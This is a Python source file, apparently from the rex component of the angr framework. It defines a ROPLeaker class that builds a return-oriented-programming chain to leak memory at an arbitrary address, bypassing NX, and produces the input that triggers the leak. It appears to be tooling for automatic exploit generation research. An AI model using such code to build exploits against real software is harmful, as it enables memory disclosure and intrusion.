import logging

l = logging.getLogger("rex.exploit.leaker")

class Leaker(object):
    '''
    Exploit wrapper for leaker an arbitray address
    '''

    def __init__(self, exploit_state):
        '''
        :param exploit_state: SimState which should have most things constrained
            by the payload and the address to leak
        '''

        self.bypasses_nx = False
        self.bypasses_aslr = False

        self.exploit_state = exploit_state

    def payload(self, addr, length):
        raise NotImplementedError

class ROPLeaker(Leaker):
    '''
    Exploit which uses ROP to leak the memory at a given address
    '''

    def __init__(self, exploit_state, chain_addr, chain_len, uncontrolled_regs, rop):
        '''
        :param chain_addr: address the chain must be placed for exploitation
        :param chain_len: max length of the chain
        :param uncontrolled_regs: register uncontrolled by rop, but controlled by exploit_state
        :param rop: angr ROP object which can create chains
        '''
        super(ROPLeaker, self).__init__(exploit_state)
        self.bypasses_nx = True

        self.chain_addr = chain_addr
        self.chain_len = chain_len
        self.uncontrolled_regs = uncontrolled_regs
        self.rop_engine = rop

    def payload(self, addr, length):

        # create the chain
        chain = self.rop_engine.do_syscall(2, [1, addr, length], ignore_registers=self.uncontrolled_regs)

        assert chain.payload_len <= self.chain_len, "angrop's built chain is too long!"

        cbvv = self.exploit_state.BVV(chain.payload_str())

        cp = self.exploit_state.copy()
        cp.add_constraints(cp.memory.load(self.chain_addr, chain.payload_len) == cbvv)
        return cp.posix.dumps(0)
